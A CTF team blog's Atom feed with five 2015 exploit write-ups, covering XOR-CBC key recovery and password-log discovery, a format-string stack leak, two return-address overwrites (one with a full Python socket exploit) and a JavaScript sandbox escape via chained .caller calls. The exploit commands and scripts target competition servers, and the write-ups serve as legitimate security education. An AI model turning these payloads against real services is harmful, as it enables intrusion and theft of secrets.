<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploit | GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/blog/categories/exploit/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-04-06T01:54:30+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Updator Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup/"/>
    <updated>2015-04-05T03:28:56+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Updator Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Unhackable : &ldquo;Not hackable; that cannot be hacked or broken into.&rdquo;
We manage updates and thus have fixes, this is not a PS3 as it is unhackable &hellip; or is it?
Score     200
Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.nuitduhack.com/</a></p></blockquote>

<p>openning the url gives us a login page and a update button. pressing update button shows an notification:</p>

<blockquote><p>The update managing system is still under construction but will be available soon.</p></blockquote>

<p>We noticed it&rsquo;s a python script <code>update.py</code>. So attempting to loading <code>update.pyc</code> gave us the permission to download the file. Instantly i tried to decompile the code with <code>uncompyle2</code> as:</p>

<!--more-->


<pre><code>$ /usr/local/bin/uncompyle2 update.pyc &gt; update.py
$ cat update.py
# 2015.04.05 03:00:11 IRDT
# Embedded file name: update.py
import config
import sys
KEY = config.KEY

def xor(*args):
    if len(args) &lt; 2:
        sys.exit(0)
    length = len(args[0])
    for arg in args:
        if len(arg) != length:
            sys.exit(0)
        length = len(arg)

    cipher = args[0]
    for arg in args[1:]:
        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])

    return cipher


class Crypto:

    @staticmethod
    def encrypt(file):
        with open(file, 'r') as fd:
            content = fd.read()
        content = content.ljust(len(content) + (8 - len(content) % 8), '0')
        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
        with open('%s.encrypted' % file, 'w') as fd:
            encrypted = []
            for i in range(len(blocks)):
                if i == 0:
                    encrypted.append(xor(KEY, blocks[i]))
                else:
                    encrypted.append(xor(KEY, blocks[i], encrypted[i - 1]))

            fd.write(''.join(encrypted))

    @staticmethod
    def decrypt(file):
        with open(file, 'r') as fd:
            content = fd.read()
        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
        with open('.'.join(file.split('.')[:-1]), 'w') as fd:
            plain = []
            for i in range(len(blocks)):
                if i == 0:
                    plain.append(xor(KEY, blocks[i]))
                else:
                    plain.append(xor(KEY, blocks[i], blocks[i - 1]))

            fd.write(''.join(plain).rstrip('0'))


print 'Content-Type: text/html'
print '\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset="UTF-8"&gt;\n    &lt;title&gt;Updator - Update system&lt;/title&gt;\n    &lt;link rel="stylesheet" href="static/font-awesome/css/font-awesome.css"&gt;\n    &lt;link rel="stylesheet" href="static/css/style.css"&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id="info"&gt;\n      The update managing system is still under construction but will be available soon.\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n'
# okay decompyling update.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2015.04.05 03:00:11 IRDT
</code></pre>

<p>This a simple CBC mode XOR encryption. In the meantime my friend figured out that <code>robots.txt</code> tells us we should take look at <code>/temp/</code> directory. there was a file named <code>log.py.encrypted</code>:</p>

<blockquote><p>Index of /temp
[ICO]  Name    Last modified   Size    Description<br/>
[DIR]  Parent Directory        - <br/>
[TXT]  log.py.encrypted    31-Mar-2015 17:35   328      <br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>As we saw in the decompiled source the encrypt function encrypts a file and saves as <code>name+.encrypted</code>. So we tried to decrypt the file as my friend did. with this assumption that the first block has <code>import</code> keyword he xor the first block with that and take a some chars for the <code>KEY</code>. remember the CBC mode:
<img src="http://upload.wikimedia.org/wikipedia/commons/8/80/CBC_encryption.svg"/><br/>
We have second block if we calculate <code>encrypted[0] ^ encrypted[1]</code>. So he xored the calculated block and the key he take from the previous part. and there was <code>atetime</code>. So after completing the key we can decrypt the file. ( ofcourse it is not a proper solution as you can use xortool and &hellip; but faster than everything :) thanks to him ;) ). So i managed to decrypt the file using edited above source:</p>

<pre><code>import sys
KEY = '6[@dq"&amp;s'

def xor(*args):
    if len(args) &lt; 2:
        sys.exit(0)
    length = len(args[0])
    for arg in args:
        if len(arg) != length:
            sys.exit(0)
        length = len(arg)

    cipher = args[0]
    for arg in args[1:]:
        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])

    return cipher


def decrypt(file):
    with open(file, 'rb') as fd:
        content = fd.read()
    blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
    with open('.'.join(file.split('.')[:-1]), 'w') as fd:
        plain = []
        for i in range(len(blocks)):
            if i == 0:
                plain.append(xor(KEY, blocks[i]))
            else:
                plain.append(xor(KEY, blocks[i], blocks[i - 1]))

        fd.write(''.join(plain).rstrip('0'))


decrypt('log.py.encrypted')
</code></pre>

<p>make sure you use <code>rb</code> to decrypt properly. We have decrypted file as:</p>

<pre><code>import datetime

LOG_DIR = 'logs'

class Logger():

    @staticmethod
    def log(username, password):
        basename = '%s/%s_%s' % (LOG_DIR, str(datetime.date.today()), username)
        with open(basename, 'a+') as fd:
            fd.write('[%s] Login with password %s\n' % (str(datetime.datetime.today()), password))
</code></pre>

<p>there is another directory we should take a look <code>logs</code> no permission:</p>

<blockquote><p>Forbidden<br/>
You don&rsquo;t have permission to access /logs/ on this server.<br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>but reading carefully the code gave me the idea to find the exact location:</p>

<pre><code class="python">&gt;&gt;&gt; import datetime
&gt;&gt;&gt; str(datetime.date.today())
'2015-04-04'
&gt;&gt;&gt; print "%s/%s_%s" %("logs", str(datetime.date.today()), "admin")
logs/2015-04-04_admin
&gt;&gt;&gt; 
</code></pre>

<p>opening <code>http://updator.challs.nuitduhack.com/logs/2015-04-04_admin</code> gave me this log:</p>

<blockquote><p>[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf
[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf</p></blockquote>

<p>Second password worked for me and after logging in we have the flag:</p>

<blockquote><p>Well played, here is your flag : zEpbiUFt5p7m84cxOxN6</p></blockquote>

<p>Interesting challenge So we&rsquo;ve got 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - TEAM Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/"/>
    <updated>2015-04-03T03:16:39+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 TEAM Writeup</strong><br/>
<strong>Point = 600</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.</p></blockquote>

<pre><code>$ file team
team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
$ checksec.sh --file team
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team
</code></pre>

<p>Ok looking into the binary in IDA shows us two function <code>0x08048769</code> and <code>0x080486ad</code> are important to us. the first one can be seen bellow:</p>

<!--more-->


<pre><code>int sub_8048769()
{
  const char *v0; // ST18_4@1
  const char *v1; // ST1C_4@1

  v0 = (const char *)malloc(0xC8u);
  v1 = (const char *)malloc(0x64u);
  printf("Enter teamname: ");
  fflush(stdout);
  __isoc99_scanf("%200s", v0);
  printf("Enter flag: ");
  fflush(stdout);
  __isoc99_scanf("%100s", v1);
  sleep(2u);
  sub_80486AD(v0, v1);
  free((void *)v0);
  free((void *)v1);
  return 0;
}
</code></pre>

<p>As you can see there is no potential flaw so we skip to second one:</p>

<pre><code>signed int __cdecl sub_80486AD(const char *a1, const char *a2)
{
  signed int result; // eax@2
  int v3; // edx@7
  FILE *stream; // [sp+24h] [bp-74h]@1
  char s; // [sp+28h] [bp-70h]@3
  int v6; // [sp+8Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    fgets(&amp;s, 100, stream);
    printf(a1);
    if ( !strcmp(&amp;s, a2) )
      puts(" : correct flag!");
    else
      puts(" : incorrect flag. Try again.");
    fclose(stream);
    result = 0;
  }
  else
  {
    result = 1;
  }
  v3 = *MK_FP(__GS__, 20) ^ v6;
  return result;
}
</code></pre>

<p>interesting! in this function flag.txt will be opened and read but the important part is <code>printf(a1);</code>. remember previous function <code>a1</code> is the <code>v0</code> var which have the teamname! So there is a <em>Format String Vulnerability</em>. And the abuse is pretty simple, just printing the stack addresses to leak the flag:</p>

<pre><code>$ cat 5
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
A

$ cat 5 | nc hack.bckdr.in 8004
Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.
</code></pre>

<p>you can see that
<code>
0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137
</code>
is our flag. using python <code>struct</code> module for all gives us this one:</p>

<pre><code>[redacted]
</code></pre>

<p>which added 600pts to our points.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - FORGOT Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/"/>
    <updated>2015-04-03T02:57:55+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 FORGOT Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br/>
Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p></blockquote>

<pre><code>$ file forgot
forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped
</code></pre>

<pre><code>$ ./forgot 
What is your name?
&gt; AAAAAAAAA

Hi AAAAAAAAA


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
&gt; AAAAAAAAAAAAAAAAAA
Dude, you seriously think this is going to work. Where are the fancy @ and [dot], huh?
</code></pre>

<p>without loosing time opening the binary into IDA shows us several functions but the General function to this functionality is <code>0x08047AA</code>. lets see the psuedo-code :</p>

<!--more-->


<pre><code>...
  puts("What is your name?");
  printf("&gt; ");
  fflush(stdout);
  fgets((char *)&amp;v19, 32, stdin);
  sub_80485DD(&amp;v19);
  fflush(stdout);
  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
  fflush(stdout);
  puts("Enter the string to be validate");
  printf("&gt; ");
  fflush(stdout);
  __isoc99_scanf("%s", &amp;v8);
  for ( i = 0; ; ++i )
 ...
</code></pre>

<p>This is the interesting part since we have control on inputs. <code>v19</code> is a 32 char buffer so no vulnerabilty is there. but what about <code>__isoc99_scanf("%s", &amp;v8);</code> ? obviously using <em>scanf</em> in such a manner is exteremly dangerous. <code>v8</code> also is a 32 char buffer. so it is also another stack buffer overflow like <code>ECHO</code>. lets check this condition :</p>

<pre><code>$ python -c 'print "GeeksSpeak\n"+"A"*40+"\n"' &gt; forgot.test
hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ cat forgot.test 
GeeksSpeak
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ ./forgot &lt; forgot.test 
What is your name?
&gt; 
Hi GeeksSpeak


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
Segmentation fault (core dumped)
</code></pre>

<p>and <code>gdb</code> proves this too. but how should i read the flag? do we need ROP? or something simillar? i started dumping strings in IDA and located these:</p>

<pre><code>.rodata:08048D9F 00000007 C ./flag
.rodata:08048DA6 00000007 C cat %s
</code></pre>

<p>these strings had been used in <code>0x080486CC</code> and finding a call system proves that like ECHO we should just using this function as RET.</p>

<p>by using this piece of code we have:</p>

<pre><code class="python">#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='&gt; '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) &gt; 0
        data += c
    return data

def p(v):
    return struct.pack('&lt;I', v)

def u(v):
    return struct.unpack('&lt;I', v)[0]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('hack.bckdr.in', 8009))
f = s.makefile('rw', bufsize=0)

readuntil(f)
f.write("A\n")
readuntil(f)
f.write("A"*32+p(0x80486CC)+"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<pre><code>$ python sol.py 
[redacted]
*** Connection closed by remote host ***
</code></pre>

<p>We&rsquo;ve got the flag. 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - CONCEALED Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/"/>
    <updated>2015-04-03T02:33:31+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 CONCEALED Writeup</strong><br/>
<strong>Point = 150</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>All paths have been concealed. Get the hidden flag: nc hack.bckdr.in 8005. Submit sha-256 of the flag</p></blockquote>

<pre><code>$ nc hack.bckdr.in 8005
######################################
####           CONCEAL            ####
######################################

Welcome to CONCEAL
You have access to object named sandboxed and its functions 
Rest everything is sandboxed, don't be a jerk and break something
Wrap your code in a function and return what you want as output
Flag is hidden somewhere in the code. 
Get the flag :D!

home@jail:$ 
</code></pre>

<p>First of all as banner says we should use all our payload as a function like :</p>

<!--more-->


<pre><code>home@jail:$ function exploit() { return "GeeksSpeak"; }
GeeksSpeak
home@jail:$ 
</code></pre>

<p>After some diging into the the challenge, trying to break the jail and so on, reading banner carefully indicates that the flag is in the code so i should read codes but how?</p>

<p>In javascript we can use arguments.caller to see which function calls our current function so i made up an example and tested it:</p>

<pre><code>home@jail:$ function exploit() { return exploit.caller.toString(); }
function () {return (function exploit() { return exploit.caller.toString(); })()}
home@jail:$ function exploit() { return (exploit.caller).caller.toString(); }
function () {
        if (!(this instanceof Script)) {
          throw new TypeError('invalid call to ' + f);
        }
        return ns[f].apply(ns, arguments);
      }
home@jail:$ 
</code></pre>

<p>this proved my idea, so i used caller repeatedly and finally got the flag as bellow:</p>

<pre><code>home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
function (err, line) {

    // flag : [redacted]

    if (err &amp;&amp; wait === false) {
      return callback(err);
    }

    var against = {},
        numericInput,
        isValid;

    if (line !== '') {
      if (schema.properties[propName]) 
      [..stripped..]
</code></pre>

<p>and sha256 of the <code>[redacted]</code> gives us another 150pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - ECHO Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup/"/>
    <updated>2015-04-03T02:12:58+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-echo-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 ECHO Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Binary</strong></p>

<blockquote><p>Little Suzie started learning C. She created a simple program that echo&rsquo;s back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.</p></blockquote>

<pre><code>$ file echo
echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=15ec07e5664a13e94069c818141cc9f70591d0f0, not stripped
</code></pre>

<p>As it seems we have a 32bit binary as a ECHO server. the output confirms this:</p>

<pre><code>$ nc hack.bckdr.in 8002
GeeksSpeak
ECHO: GeeksSpeak
</code></pre>

<p>opening the binary in IDA shows us that the main function calls test() as we can see the psuedo-code below :</p>

<!-- more -->


<pre><code>int test()
{
  char s; // [sp+1Eh] [bp-3Ah]@1

  gets(&amp;s);
  return fprintf(_bss_start, "ECHO: %s\n", &amp;s);
}
</code></pre>

<p>It&rsquo;s an obvious Stack buffer overflow. without loosing time i loaded it into <em>gdb</em> and used  cyclic pattern to find the offset:</p>

<pre><code>$ gdb ./echo -q
Reading symbols from ./echo...(no debugging symbols found)...done.
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ shell echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' &gt; echo.test
gdb-peda$ r &lt; echo.test 
Starting program: /home/hamidx9/ctf/backdoor/echo &lt; echo.test
ECHO: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[-----------------------------------------------------------------------------------------------------------registers-----------------------------------------------------------------------------------------------------------]
EAX: 0x6b (b'k')
EBX: 0xf7fae000 --&gt; 0x1a8da8 
ECX: 0x6b (b'k')
EDX: 0xf7faf86c --&gt; 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41324141 (b'AA2A')
ESP: 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
EIP: 0x41414841 (b'AHAA')
[-------------------------------------------------------------------------------------------------------------code--------------------------------------------------------------------------------------------------------------]
Invalid $PC address: 0x41414841
[-------------------------------------------------------------------------------------------------------------stack-------------------------------------------------------------------------------------------------------------]
00:0000| esp 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
01:0004|     0xffffcdd4 ("AAIAAeAA4AAJAAf"...)
02:0008|     0xffffcdd8 ("AeAA4AAJAAfAA5A"...)
03:0012|     0xffffcddc ("4AAJAAfAA5AAKAA"...)
04:0016|     0xffffcde0 ("AAfAA5AAKAAgAA6"...)
05:0020|     0xffffcde4 ("A5AAKAAgAA6AAL")
06:0024|     0xffffcde8 ("KAAgAA6AAL")
07:0028|     0xffffcdec ("AA6AAL")
[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]
Legend: stack, code, data, heap, rodata, value
Stopped reason: SIGSEGV
0x41414841 in ?? ()
gdb-peda$ pattern_offset 'AHAA'
AHAA found at offset: 62
gdb-peda$ 
</code></pre>

<p>So the <code>offset = 62</code>. but where should we jump? IDA shows us there is another function named <code>sample</code> which open <code>flag.txt</code> and print its content. All have to do is to call <code>sample</code> with address = <em>0x0804854d</em>.</p>

<p>Final payload looks like below :</p>

<pre><code>[A*62] + [0x0804854d in little endian]
</code></pre>

<p>And finally we&rsquo;ve got the flag:</p>

<pre><code>$ python -c 'import struct; q=lambda x: struct.pack("&lt;I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
[redacted]
</code></pre>

<p>And another 100 pt.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
</feed>
